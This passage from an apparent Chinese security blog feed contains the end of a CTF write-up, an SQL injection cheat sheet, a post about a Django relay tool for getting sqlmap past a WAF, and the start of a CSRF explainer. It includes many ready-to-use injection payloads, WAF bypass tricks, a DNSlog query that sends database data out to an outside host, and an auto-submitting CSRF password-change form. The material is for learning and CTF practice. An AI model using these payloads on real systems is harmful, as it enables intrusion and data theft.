class="line">$pass &#x3D; md5($_POST[pass]);</span><br><span class="line"></span><br><span class="line">$sql &#x3D; &quot;select pw from php where user&#x3D;&#39;$user&#39;&quot;;</span><br><span class="line">$query &#x3D; mysql_query($sql);</span><br><span class="line">if (!$query) &#123;</span><br><span class="line">printf(&quot;Error: %s\n&quot;, mysql_error($conn));</span><br><span class="line">exit();</span><br><span class="line">&#125;</span><br><span class="line">$row &#x3D; mysql_fetch_array($query, MYSQL_ASSOC);</span><br><span class="line">&#x2F;&#x2F;echo $row[&quot;pw&quot;];</span><br><span class="line">  </span><br><span class="line">  if (($row[pw]) &amp;&amp; (!strcasecmp($pass, $row[pw]))) &#123;</span><br><span class="line">echo &quot;&lt;p&gt;Logged in! Key:************** &lt;&#x2F;p&gt;&quot;;</span><br><span class="line">&#125;</span><br><span class="line">else &#123;</span><br><span class="line">    echo(&quot;&lt;p&gt;Log in failure!&lt;&#x2F;p&gt;&quot;);</span><br><span class="line"></span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br><span class="line">&lt;form method&#x3D;post action&#x3D;index.php&gt;</span><br><span class="line">&lt;input type&#x3D;text name&#x3D;user value&#x3D;&quot;Username&quot;&gt;</span><br><span class="line">&lt;input type&#x3D;password name&#x3D;pass value&#x3D;&quot;Password&quot;&gt;</span><br><span class="line">&lt;input type&#x3D;submit&gt;</span><br><span class="line">&lt;&#x2F;form&gt;</span><br><span class="line">&lt;&#x2F;body&gt;</span><br><span class="line">&lt;a href&#x3D;&quot;index.txt&quot;&gt;</span><br><span class="line">&lt;&#x2F;html&gt;</span><br></pre></td></tr></table></figure><br>strcasecmp()函数不分大小写进行字符串比较。<br>首先我们不知道数据库里已有的用户值为多少，更不知其密码。<br>不过我们可以通过构造联合查询注入来返回我们自定义的数据。<br>payloadd:<br><code>user=abc&#39; union select &#39;c4ca4238a0b923820dcc509a6f75849b&amp;pass=1</code><br>1的md5为：c4ca4238a0b923820dcc509a6f75849b<br><img src="https://i.loli.net/2019/04/11/5caf6479b0889.png" alt="">  </p><h3 id="0x18-what-a-fuck-这是什么鬼东西"><a href="#0x18-what-a-fuck-这是什么鬼东西" class="headerlink" title="0x18 what a fuck!这是什么鬼东西?"></a>0x18 what a fuck!这是什么鬼东西?</h3><h4 id="简单概括：-23"><a href="#简单概括：-23" class="headerlink" title="简单概括："></a>简单概括：</h4><ul><li>考点：JSFUCK  </li><li>难度：易  </li><li>WP：<code>复制代码到浏览器控制台执行即可</code>  </li></ul><h4 id="解题过程：-20"><a href="#解题过程：-20" class="headerlink" title="解题过程："></a>解题过程：</h4><p>复制粘贴进浏览器的js控制台，回车运行即可。<br><img src="https://i.loli.net/2019/04/12/5caf64ffb33cb.png" alt="">  </p><h3 id="0x19-PHP大法"><a href="#0x19-PHP大法" class="headerlink" title="0x19 PHP大法"></a>0x19 PHP大法</h3><h4 id="简单概括：-24"><a href="#简单概括：-24" class="headerlink" title="简单概括："></a>简单概括：</h4><ul><li>考点：PHP自动解码机制  </li><li>难度：易  </li><li>WP：<code>id=%2568ackerDJ</code></li></ul><h4 id="解题过程：-21"><a href="#解题过程：-21" class="headerlink" title="解题过程："></a>解题过程：</h4><p>打开题目，页面提示：index.php.txt，打开得到源码：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">if(eregi(&quot;hackerDJ&quot;,$_GET[id])) &#123;</span><br><span class="line">  echo(&quot;&lt;p&gt;not allowed!&lt;&#x2F;p&gt;&quot;);</span><br><span class="line">  exit();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$_GET[id] &#x3D; urldecode($_GET[id]);</span><br><span class="line">if($_GET[id] &#x3D;&#x3D; &quot;hackerDJ&quot;)</span><br><span class="line">&#123;</span><br><span class="line">  echo &quot;&lt;p&gt;Access granted!&lt;&#x2F;p&gt;&quot;;</span><br><span class="line">  echo &quot;&lt;p&gt;flag: *****************&#125; &lt;&#x2F;p&gt;&quot;;</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br><span class="line">&lt;br&gt;&lt;br&gt;</span><br><span class="line">Can you authenticate to this website?</span><br></pre></td></tr></table></figure></p><p><code>$_GET[id]</code>在取到值后已经自动urldecode了一次，然而后边再用urldecode解码一次，故可以使用二次编码绕过前边的关键字检测。<br><img src="https://i.loli.net/2019/04/12/5caf66674a8d7.png" alt="">  </p><h3 id="0x1A-这个看起来有点简单"><a href="#0x1A-这个看起来有点简单" class="headerlink" title="0x1A 这个看起来有点简单!"></a>0x1A 这个看起来有点简单!</h3><h4 id="简单概括：-25"><a href="#简单概括：-25" class="headerlink" title="简单概括："></a>简单概括：</h4><ul><li>考点：Union无过滤注入  </li><li>难度：易  </li><li>WP：无</li></ul><h3 id="0x1B-貌似有点难"><a href="#0x1B-貌似有点难" class="headerlink" title="0x1B 貌似有点难"></a>0x1B 貌似有点难</h3><h4 id="简单概括：-26"><a href="#简单概括：-26" class="headerlink" title="简单概括："></a>简单概括：</h4><ul><li>考点：Header头IP伪造  </li><li>难度：易  </li><li>WP：无</li></ul><h3 id="0x1C-头有点大"><a href="#0x1C-头有点大" class="headerlink" title="0x1C 头有点大"></a>0x1C 头有点大</h3><h4 id="简单概括：-27"><a href="#简单概括：-27" class="headerlink" title="简单概括："></a>简单概括：</h4><ul><li>考点：UA头伪造  </li><li>难度：易  </li><li>WP：无  </li></ul><h3 id="0x1D-猫抓老鼠"><a href="#0x1D-猫抓老鼠" class="headerlink" title="0x1D 猫抓老鼠"></a>0x1D 猫抓老鼠</h3><h4 id="简单概括：-28"><a href="#简单概括：-28" class="headerlink" title="简单概括："></a>简单概括：</h4><ul><li>考点：脑洞  </li><li>难度：及其变态神经病的题目  </li><li>WP：无</li></ul><h4 id="解题过程：-22"><a href="#解题过程：-22" class="headerlink" title="解题过程："></a>解题过程：</h4><p>查看访问请求返回头，发现有东西：<br><img src="https://i.loli.net/2019/04/12/5caf67566e8f0.png" alt=""><br>将这串base64放到表单里提交即可。</p><h3 id="0x1E-看起来有点难"><a href="#0x1E-看起来有点难" class="headerlink" title="0x1E 看起来有点难"></a>0x1E 看起来有点难</h3><h4 id="简单概括：-29"><a href="#简单概括：-29" class="headerlink" title="简单概括："></a>简单概括：</h4><ul><li>考点：时间盲注  </li><li>难度：中  </li><li>WP：sqlmap一把嗦</li></ul>]]></content>
      
      
      <categories>
          
          <category> 原创栏目 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>SQL注入备忘录</title>
      <link href="2019/SQL%E6%B3%A8%E5%85%A5%E5%A4%87%E5%BF%98%E5%BD%95/"/>
      <url>2019/SQL%E6%B3%A8%E5%85%A5%E5%A4%87%E5%BF%98%E5%BD%95/</url>
      
        <content type="html"><![CDATA[<h1 id="备忘录-一"><a href="#备忘录-一" class="headerlink" title="备忘录(一)"></a>备忘录(一)</h1><p>拿起小本本记下常考知识点。</p><h2 id="常用连接词"><a href="#常用连接词" class="headerlink" title="常用连接词"></a>常用连接词</h2><ul><li>and &amp;&amp; %23%23 且</li><li>or || %7c%7c 或</li><li>xor 非</li></ul><h2 id="Access-数据库："><a href="#Access-数据库：" class="headerlink" title="Access 数据库："></a>Access 数据库：</h2><p><strong>只能爆破表名、列名获取数据、无法用盲注等<br>数据主要存储在mdb、sap文件内</strong></p><a id="more"></a><h3 id="0x01-手工："><a href="#0x01-手工：" class="headerlink" title="0x01 手工："></a>0x01 手工：</h3><p>先判断字段数：<br><code>order by xx</code><br>在使用联合查询猜测表名列名：  </p><blockquote><p>前后两个子查询返回的结构必须相同，且数据类型必须相同，故常用NULL</p></blockquote><p>猜表：<code>union select 1,2,3,xx</code><br>猜列：<code>union select 1,2,password,4,5</code> (如果页面返回正常，则存在password列，猜表同理)<br>此方法<strong>兼容性</strong>不强。</p><h3 id="0x02-工具："><a href="#0x02-工具：" class="headerlink" title="0x02 工具："></a>0x02 工具：</h3><p>逐字猜解法：<br>一、<strong>查表：</strong><br><code>and exists (select * from 表名)</code>//这里的表名需要靠猜解，如果表名存在返回正常页面。<br>二、<strong>查列：</strong><br>将<code>*</code>换成列名可进行爆破列名，即：<code>and exists (select 列名 from 表名)</code><br>三、<strong>确定列名下的数据长度：</strong><br><code>and (select top 1 len(列名) from 表名)=5</code> //判断数据长度是否为5，若为5则返回正常<br>四、<strong>逐字猜解数据：</strong><br><code>and (select top 1 asc(mid(列名,位数,1)) from 表名)=97</code> //用mid函数取第x位字母，通过asc函数转化成ascii码进行判断比较，如果ascii为97，即字母a，页面返回正常</p><h2 id="mysql数据库："><a href="#mysql数据库：" class="headerlink" title="mysql数据库："></a>mysql数据库：</h2><h3 id="Version-lt-5-0"><a href="#Version-lt-5-0" class="headerlink" title="Version&lt;5.0:"></a>Version&lt;5.0:</h3><ul><li>爆破</li><li>盲注</li></ul><h3 id="version-gt-5-0"><a href="#version-gt-5-0" class="headerlink" title="version&gt;=5.0:"></a>version&gt;=5.0:</h3><p><strong>information_schema</strong>表下存储了Mysql数据库所有的数据库结果信息。  </p><ul><li>information_schema.schemeta //Mysql里所有的数据库库名</li><li>information_schema.tables //所有表名</li><li>information_schema.columns //所有列名</li></ul><p><strong>常用函数：</strong></p><ul><li>user() //查询数据库用户</li><li>version()  //查询版本</li><li>@@basedir()  //查询数据库路径</li><li>database() //查询当前数据库名</li><li>@@version_compile_os() //查询操作系统</li></ul><p><strong>用法例子：</strong><br><code>union select user(),2,3,version(),database(),xxx</code><br><em>可用null代替：</em><br><code>union select user(),null,null,version(),database(),xxx</code>  </p><p><strong>更多函数：</strong></p><ul><li>concat() //字符串相加</li><li>group_concat() //分组打印</li><li>length() //取字符串长度</li><li>substr(str,pos,len) //str字符串从pos位置开始取len个长度 substring()别名</li><li>mid(str,pos,len)  //str字符串从pos位置开始取len个长度</li><li>ascii(str)  //返回字符串str的首个字符的ASCII代码值</li><li>ord(str) //str或bool转为ascii</li><li>if(a,b,c) //a为条件，若a正确则返回b，相反返回c.</li></ul><p><strong>常用查询：</strong><br>查询全部数据库名：<br><code>select schema_name from information_schema.schemeta limit 0,10</code> //取前十个<br>查询指定表名：<br><code>select table_name from information_schema.tables where table_schema=&#39;sqli&#39;</code> //若单引号被过滤可用十六进制<br>查询指定列名：<br><code>select column_name from information_schema.columns where table_name=&#39;user&#39; and table_schema=&#39;sqli&#39;</code><br>获取指定数据:<br><code>select username,password from sqli.user</code> (垮库查询)  </p><h3 id="注释："><a href="#注释：" class="headerlink" title="注释："></a>注释：</h3><blockquote><p>#，<br>– X(X为任意字符)<br>/<em>(MySQL-5.1)<br>;%00<br><code>&#39;or 1=1;%00  &#39;or 1=1 union select 1,2</code>‘<br>‘or 1=1 #<br>‘/</em>!50000or<em>/ 1=1 – -      //版本号为5.1.38时只要小于50138<br>‘/</em>!or*/ 1=1 – -  </p></blockquote><p><strong>nd/or后面可以跟上偶数个!、~可以替代空格，也可以混合使用(混合后规律又不同)，and/or前的空格可以省略</strong></p><h2 id="宽字节注入："><a href="#宽字节注入：" class="headerlink" title="宽字节注入："></a>宽字节注入：</h2><p>一、常见：<br><strong>mysql数据库编码为gbk,且若’被转义成\’<br>使用<code>id=%df%27</code>，这里的<code>%27</code>会被变成<code>\%27</code>即<code>%5c%27</code>，再加上前边的<code>%df</code>变成<code>%df%5c%27</code>，而<code>%df%5c</code>在gbk字符集中表示汉子： 運，故语句便成<code>id=運&#39;</code>，成功逃逸出单引号转义(php中通常是addslashes函数，或开启GPC，PHP5.4版本已移除GPC)</strong><br>二、php函数utf8转gbk产生：<br><a href="https://xz.aliyun.com/t/1719">https://xz.aliyun.com/t/1719</a></p><h2 id="报错注入："><a href="#报错注入：" class="headerlink" title="报错注入："></a>报错注入：</h2><h3 id="floor-和rand"><a href="#floor-和rand" class="headerlink" title="floor()和rand()"></a>floor()和rand()</h3><p><strong>虚拟表报错原理：</strong><br>payload:<br><code>union select count(*),2,concat(&#39;:&#39;,(select database()),&#39;:&#39;,floor(rand()*2))as a from information_schema.tables group by a</code><br><a href="https://www.2cto.com/article/201604/498394.html">https://www.2cto.com/article/201604/498394.html</a></p><h3 id="extractvalue"><a href="#extractvalue" class="headerlink" title="extractvalue()"></a>extractvalue()</h3><p><strong>原理：</strong><br>extractvalue函数的第二个参数格式错误，会返回参数内容<br>payload:<br><code>and (extractvalue(1,concat(0x7e,(select user()),0x7e)))</code></p><h3 id="updatexml-同上具有32位长度限制"><a href="#updatexml-同上具有32位长度限制" class="headerlink" title="updatexml() 同上具有32位长度限制"></a>updatexml() 同上具有32位长度限制</h3><p>原理同上<br>payload:<br><code>and (updatexml(1,concat(0x7e,(select user()),0x7e),1))</code><br>// concat 在前后加上 ~ 使数据不符合参数格式从而报错</p><h3 id="GeometryCollection-等三重子查询报错"><a href="#GeometryCollection-等三重子查询报错" class="headerlink" title="GeometryCollection()等三重子查询报错"></a>GeometryCollection()等三重子查询报错</h3><blockquote><p>id = 1 AND GeometryCollection((select <em> from (select </em> from(select user())a)b))<br>polygon()<br>id =1 AND polygon((select <em> from(select </em> from(select user())a)b))<br>multipoint()<br>id = 1 AND multipoint((select <em> from(select </em> from(select user())a)b))<br>multilinestring()<br>id = 1 AND multilinestring((select <em> from(select </em> from(select user())a)b))<br>linestring()<br>id = 1 AND LINESTRING((select <em> from(select </em> from(select user())a)b))<br>multipolygon()<br>id =1 AND multipolygon((select <em> from(select </em> from(select user())a)b))</p></blockquote><h3 id="exp-Mysql5-5-5"><a href="#exp-Mysql5-5-5" class="headerlink" title="exp() Mysql5.5.5+"></a>exp() Mysql5.5.5+</h3><p><strong>原理：</strong><br>exp函数参数过大，转换时溢出报错<br>payload:<br><code>and exp(~(select * from(select user())a))</code><br><a href="https://drops.secquan.org/tips/8166">https://drops.secquan.org/tips/8166</a></p><h3 id="以上类型均为子查询注入"><a href="#以上类型均为子查询注入" class="headerlink" title="以上类型均为子查询注入"></a>以上类型均为子查询注入</h3><h2 id="Mysql盲注："><a href="#Mysql盲注：" class="headerlink" title="Mysql盲注："></a>Mysql盲注：</h2><h3 id="类型"><a href="#类型" class="headerlink" title="类型"></a>类型</h3><ul><li>布尔盲注</li><li>时间盲注</li></ul><p>布尔盲注：<br><code>and ascii(substr(select user(),1,1))&gt;64</code> 如果user()第一位字母Ascii大于64则页面返回正常<br>时间盲注：<br><code>and if(ascii(substr(select user(),1,1))&gt;64,sleep(2),1)</code> 如果user()第一位字母Ascii大于64则页面延迟两秒返回  </p><h3 id="BENCHMARK-count-expr"><a href="#BENCHMARK-count-expr" class="headerlink" title="BENCHMARK(count,expr)"></a>BENCHMARK(count,expr)</h3><p>此函数会执行expr函数count此，会造成明显时间延迟，可构造进行时间盲注</p><p>常见注入：</p><ul><li>数字型</li><li>字符串型<br>按照注入类型：<br>+SELECT型  //常用于获取信息，注入处常位于where 后，后可接注释字符保证查询的语法正确。<br>+INSERT型  //建立新的数据<br>+UPDATA型  //修改数据<br>+DELECT型  //删除数据</li></ul><p>MYSQL长度限制绕过<br>MYSQL对于用户输入的超长字符只会warning 而不是error<br>真实案例： WP注册admin(55个空格)x用户 修改管理员密码</p><h2 id="DNSlog注入"><a href="#DNSlog注入" class="headerlink" title="DNSlog注入"></a>DNSlog注入</h2><p><code>select load_file(concat(&#39;\\\\&#39;,(select database()),&#39;.xxxx.ceye.io\&#39;);</code><br><a href="https://www.cnblogs.com/afanti/p/8047530.html">https://www.cnblogs.com/afanti/p/8047530.html</a><br><a href="https://wooyun.js.org/drops/%E5%9C%A8SQL%E6%B3%A8%E5%85%A5%E4%B8%AD%E4%BD%BF%E7%94%A8DNS%E8%8E%B7%E5%8F%96%E6%95%B0%E6%8D%AE.html">https://wooyun.js.org/drops/%E5%9C%A8SQL%E6%B3%A8%E5%85%A5%E4%B8%AD%E4%BD%BF%E7%94%A8DNS%E8%8E%B7%E5%8F%96%E6%95%B0%E6%8D%AE.html</a>  </p><h2 id="SQL注入防御："><a href="#SQL注入防御：" class="headerlink" title="SQL注入防御："></a>SQL注入防御：</h2><p>1.预编译sql<br>2.限制输入数据类型<br>3.过滤编码<br>4.白名单<br>5.管理数据库用户权限<br>6.按时维护，打好补丁</p><h2 id="SQL注入绕过："><a href="#SQL注入绕过：" class="headerlink" title="SQL注入绕过："></a>SQL注入绕过：</h2><p><strong>注入中常注意的编码：</strong></p><ul><li>%01-%0D特殊字符绕空格</li><li>&amp;= 在浏览器Url时要进行URL编码 %26 %3d</li><li>查询字符串中不允许有空格，可用%20,+对其编码</li><li>Cookie注入时，SQL语句中的分号得编码</li></ul><h3 id="单引号过滤"><a href="#单引号过滤" class="headerlink" title="单引号过滤"></a>单引号过滤</h3><p>若有单引号保护，且无编码二次注入即无漏洞。<br>若无单引号保护：<br>字符串可用十六进制表示：<code>0x123456</code>，也可用concat(char(65)+char(75)+xxx)</p><p>注：中间层会将这些编码转换成未编码值  </p><h3 id="逗号过滤"><a href="#逗号过滤" class="headerlink" title="逗号过滤"></a>逗号过滤</h3><p>if()可改写为 case when () then () else () end<br>substr()、mid()等可改写成substr((select user())from(1)for(1))  </p><h3 id="等号过滤"><a href="#等号过滤" class="headerlink" title="等号过滤"></a>等号过滤</h3><p>可用regexp、like、rlike、in等代替  </p><h3 id="判断注入点时的绕过："><a href="#判断注入点时的绕过：" class="headerlink" title="判断注入点时的绕过："></a>判断注入点时的绕过：</h3><ul><li>&amp;&amp; 1=1</li><li>&amp;&amp; 1=true</li><li>&amp;&amp; false</li><li>%23%23 true</li><li>%23%23 ‘0’=0</li><li>%23%23 ‘a’=’b’=’c’ //true</li><li>and~!!~if(‘a’=’b’=”c”,sleep(2),1)</li><li>a’&lt;2 返回正常 &lt;0 返回空值</li></ul><p>特定字符串被过滤时可用考虑全角字符</p><h3 id="绕过WAF"><a href="#绕过WAF" class="headerlink" title="绕过WAF"></a>绕过WAF</h3><blockquote><p>a) 大小写混合<br>b)替换关键字<br>c)使用编码<br>d)使用注释<br>e)等价函数与命令<br>f)使用特殊符号<br>g)HTTP参数控制<br>h)缓冲区溢出<br>i)整合绕过  </p></blockquote><h2 id="与系统直接交互："><a href="#与系统直接交互：" class="headerlink" title="与系统直接交互："></a>与系统直接交互：</h2><blockquote><p>load_file()读取文件<br>into out_file() 写文件<br>条件：FILE权限，管理员权限默认具有<br>INTO OUTFILE 与 INTO DOMPFILE的区别<br>后者适用于二进制文件，会将目标文件写入同一行内；前者适用于文本文件。<br>MYSQL UDF命令执行：<code>sqlmap: --os-cmd id -v 1</code><br>MSSQL：xp_cmdshell</p></blockquote><h2 id="其他："><a href="#其他：" class="headerlink" title="其他："></a>其他：</h2><h3 id="Boolean注入"><a href="#Boolean注入" class="headerlink" title="Boolean注入"></a>Boolean注入</h3><p>如果页面只返回Yes或No，则原sql查询返回的值可能是可bool值，如果过滤不严，可产生boolean注入，如：<br><code>and length(database())&gt;10</code> 如果次条件为真切前条件返回真，则页面返回正常。  </p><h3 id="Cookie注入"><a href="#Cookie注入" class="headerlink" title="Cookie注入"></a>Cookie注入</h3><p>注入存在于Cookie中</p><h3 id="XFF头注入"><a href="#XFF头注入" class="headerlink" title="XFF头注入"></a>XFF头注入</h3><p>注入存在于Header有中的X-Forward-For中，此函数常用于获取客户端真实IP。</p><h3 id="堆叠注入"><a href="#堆叠注入" class="headerlink" title="堆叠注入"></a>堆叠注入</h3><p>PHP+Mysql不支持<br><img src="https://img.0x002.com/article/SQLinjection/2015081902360042624.jpg" alt=""></p><h3 id="连接符差异："><a href="#连接符差异：" class="headerlink" title="连接符差异："></a>连接符差异：</h3><p>Oracle: || 是连接符<br>MSSQL: +<br>MYSQL: [空格]  </p><h2 id="相关好文："><a href="#相关好文：" class="headerlink" title="相关好文："></a>相关好文：</h2><p><a href="https://p0sec.net/index.php/archives/117/">SQL注入备忘手册(更新2017-12-11)</a><br><a href="https://www.cnblogs.com/afanti/p/8047530.html">巧用DNSlog实现无回显注入</a><br><a href="https://wooyun.js.org/drops/MySQL%E6%B3%A8%E5%85%A5%E6%8A%80%E5%B7%A7.html">MySQL注入技巧</a><br><a href="https://wooyun.js.org/drops/Mysql%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5%E5%8E%9F%E7%90%86%E5%88%86%E6%9E%90%28count%28%29%E3%80%81rand%28%29%E3%80%81group%20by%29.html">Mysql报错注入原理分析(count()、rand()、group%20by)</a><br><a href="https://wooyun.js.org/drops/%E6%B7%B1%E5%85%A5%E4%BA%86%E8%A7%A3SQL%E6%B3%A8%E5%85%A5%E7%BB%95%E8%BF%87waf%E5%92%8C%E8%BF%87%E6%BB%A4%E6%9C%BA%E5%88%B6.html">深入了解SQL注入绕过waf和过滤机制</a></p>]]></content>
      
      
      <categories>
          
          <category> 原创栏目 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> SQL注入 </tag>
            
            <tag> 备忘录 </tag>
            
            <tag> 学习笔记 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>SQL注入使用Django中继数据包bypassWAF</title>
      <link href="2019/SQL%E6%B3%A8%E5%85%A5%E4%BD%BF%E7%94%A8Django%E4%B8%AD%E7%BB%A7%E6%95%B0%E6%8D%AE%E5%8C%85bypassWAF/"/>
      <url>2019/SQL%E6%B3%A8%E5%85%A5%E4%BD%BF%E7%94%A8Django%E4%B8%AD%E7%BB%A7%E6%95%B0%E6%8D%AE%E5%8C%85bypassWAF/</url>
      
        <content type="html"><![CDATA[<h1 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h1><p>本人基于文章<strong>bypassword</strong>的文章<a href="https://www.freebuf.com/news/193659.html">在HTTP协议层面绕过WAF</a>所编写一款工具。  </p><h1 id="环境"><a href="#环境" class="headerlink" title="环境"></a>环境</h1><ul><li>Python3.7.0</li><li>Django 2.1</li><li>Requests</li></ul><h1 id="使用范围"><a href="#使用范围" class="headerlink" title="使用范围"></a>使用范围</h1><ul><li>POST注入</li><li>可以分块传输的漏洞网站</li></ul><a id="more"></a><h1 id="使用方法"><a href="#使用方法" class="headerlink" title="使用方法"></a>使用方法</h1><p>修改图中圈中的部分，Evil_Url为存在注入的地址，Domain为其域名部分。<br><img src="https://img.0x002.com/article/DjangoBypassWAF/5c9f3596b6415.webp" alt=""></p><h1 id="实例"><a href="#实例" class="headerlink" title="实例"></a>实例</h1><p>靶机环境:<br>PHP5.4+Apache2.2+Mysql5+WAF:<br><img src="https://img.0x002.com/article/DjangoBypassWAF/5c9f386c72c55.webp" alt=""><br>首先部署Django：<br><img src="https://img.0x002.com/article/DjangoBypassWAF/5c9f366a3f773.webp" alt=""><br>其次将注入点换成部署的Url：<br>如：<code>http://192.168.32.144/2.php</code>存在POST注入，注入参数为<code>id</code>，部署的Url为<code>http://127.0.0.1:8000/</code><br>Sqlmap命令为<code>python sqlmap.py -u &quot;http://127.0.0.1:8000/&quot; --data &quot;id=1&quot;</code><br><img src="https://img.0x002.com/article/DjangoBypassWAF/5c9f38de211e7.webp" alt="">  </p><p>支持<code>-r xx.txt</code>需要修改请求头中的Host地址为Django部署的地址<br><img src="https://img.0x002.com/article/DjangoBypassWAF/5c9fa0add9992.gif" alt=""></p><h1 id="下载地址："><a href="#下载地址：" class="headerlink" title="下载地址："></a>下载地址：</h1><p><a href="https://github.com/HackerYunen/Django-chunked-sqli">https://github.com/HackerYunen/Django-chunked-sqli</a><br><strong>此项目我不断更新完善，欢迎Star、Issue</strong></p><h1 id="TODO"><a href="#TODO" class="headerlink" title="TODO"></a>TODO</h1><ul><li>暂无</li></ul><h1 id="解疑"><a href="#解疑" class="headerlink" title="解疑"></a>解疑</h1><h2 id="为什么使用Django？"><a href="#为什么使用Django？" class="headerlink" title="为什么使用Django？"></a>为什么使用Django？</h2><p>因为我只会Django</p><h2 id="为什么要中继？"><a href="#为什么要中继？" class="headerlink" title="为什么要中继？"></a>为什么要中继？</h2><p>因为sqlmap等软件无法发送chunked数据包(使用tamper也不行)</p>]]></content>
      
      
      <categories>
          
          <category> 神兵利器 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Django </tag>
            
            <tag> SQL注入 </tag>
            
            <tag> Bypass </tag>
            
            <tag> WAF </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>关于CSRF的那点事儿</title>
      <link href="2019/%E5%85%B3%E4%BA%8ECSRF%E7%9A%84%E9%82%A3%E7%82%B9%E4%BA%8B%E5%84%BF/"/>
      <url>2019/%E5%85%B3%E4%BA%8ECSRF%E7%9A%84%E9%82%A3%E7%82%B9%E4%BA%8B%E5%84%BF/</url>
      
        <content type="html"><![CDATA[<h2 id="0x01-CSRF简介"><a href="#0x01-CSRF简介" class="headerlink" title="0x01 CSRF简介"></a>0x01 CSRF简介</h2><p>&#160;&#160;&#160;&#160;CSRF，也称XSRF，即跨站请求伪造攻击，与XSS相似，但与XSS相比更难防范，是一种广泛存在于网站中的安全漏洞，经常与XSS一起配合攻击。  </p><h2 id="0x02-CSRF原理"><a href="#0x02-CSRF原理" class="headerlink" title="0x02 CSRF原理"></a>0x02 CSRF原理</h2><p>&#160;&#160;&#160;&#160;攻击者通过盗用用户身份悄悄发送一个请求，或执行某些恶意操作。<br>&#160;&#160;&#160;&#160;CSRF漏洞产生的主要原因：</p><ul><li>请求所有的参数均可确定</li><li>请求的审核不严格，如：只验证了Cookie</li></ul><p>关于CSRF的执行过程，这里引用自<strong>hyddd</strong>大佬画的图：<br><img src="https://img.0x002.com/article/LearnCSRF/5c97436f3c14c.jpg" alt=""><br>&#160;&#160;&#160;&#160;我们知道，当我们使用img等标签时，通过设置标签的src等属性引入外部资源，是可以被浏览器认为是合法的跨域请求，也就是说是可以带上Cookie访问的。<br>&#160;&#160;&#160;&#160;试想一下，如果我们在a.com上放置一个img标签<code>&lt;img src=//b.com/del?id=1&gt;</code>。当b.com的用户在cookie没过期的情况下访问a.com，此时浏览器会向b.com发送一个指向<code>http://b.com/del?id=1</code>的<code>GET</code>请求，并且这个请求是带上Cookie的，而b.com的服务器仅仅是通过cookie进行权限判断，那么服务器就会进行相应的操作，比如假设此处为删除某个文章，用户在不知情的情况下便已完成操作。</p><a id="more"></a><h2 id="0x03-CSRF能够造成的危害"><a href="#0x03-CSRF能够造成的危害" class="headerlink" title="0x03 CSRF能够造成的危害"></a>0x03 CSRF能够造成的危害</h2><ul><li>篡改目标网站上的用户数据； </li><li>盗取用户隐私数据； </li><li>作为其他攻击向量的辅助攻击手法； </li><li>传播CSRF蠕虫。</li></ul><h2 id="0x04-CSRF的利用方式"><a href="#0x04-CSRF的利用方式" class="headerlink" title="0x04 CSRF的利用方式"></a>0x04 CSRF的利用方式</h2><ul><li>通过HTML标签发送合法的跨域请求</li><li>通过Ajax发送请求（由于CORS机制的存在，一般不使用）</li></ul><p>这里涉及到同源策略，如果不是很清楚可以先去了解一下。</p><h3 id="1-HTML标签"><a href="#1-HTML标签" class="headerlink" title="1) HTML标签"></a>1) HTML标签</h3><p>&#160;&#160;&#160;&#160;我们知道，根据同源策略的规定，跨域请求是不允许带上Cookie等信息的，可是出于种种考虑最终没有进行完全禁止，即存在某些合法的跨域请求。<br>&#160;&#160;&#160;&#160;通常由HTML标签<code>src</code>、<code>lowsrc</code>等属性产生的跨域请求是被浏览器认为是合法的跨域请求，并且此时并不需要<strong>javascript</strong>的参与。<br><img src="https://img.0x002.com/article/LearnCSRF/5c98de42ab890.webp" alt=""><br>&#160;&#160;&#160;&#160;由HTML标签发出的合法跨域请求与正常的用户点击发出的请求相比所不同的是：两者请求头中的<strong>Referer</strong>值不同。<br>&#160;&#160;&#160;&#160;不过值得说明的是IE浏览器在面对这种情况时会判断<strong>本地Cookie</strong>是否带上<strong>P3P</strong>属性，如果仅仅是内存Cookie则不受此影响。<br>&#160;&#160;&#160;&#160;CSRF不仅仅只能针对GET请求，也可以针对POST请求，不过只能使用from标签进行自动提交，注意此处需用到<strong>javascript</strong>。  </p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">&lt;html&gt;</span><br><span class="line">&lt;head&gt;&lt;&#x2F;head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">&lt;form action&#x3D;&quot;http:&#x2F;&#x2F;a.com&#x2F;changepass&quot; method&#x3D;&quot;POST&quot;&gt;</span><br><span class="line">&lt;input type&#x3D;&quot;hidden&quot; name&#x3D;&quot;username&quot; value&#x3D;&quot;victim&quot;&gt;</span><br><span class="line">&lt;input type&#x3D;&quot;hidden&quot; name&#x3D;&quot;password&quot; value&#x3D;&quot;hacker&quot;&gt;</span><br><span class="line">&lt;input id&#x3D;&quot;sub&quot; type&#x3D;&quot;submit&quot;&gt; &#x2F;&#x2F;可用样式表将按钮隐藏</span><br><span class="line">&lt;&#x2F;form&gt; </span><br><span class="line">&lt;script&gt;</span><br><span class="line">document.getElementById(&quot;sub&quot;).click()</span><br><span class="line">&lt;&#x2F;script&gt;</span><br><span class="line">&lt;&#x2F;body&gt;</span><br><span class="line">&lt;&#x2F;html&gt;</span><br></pre></td></tr></table></figure><h3 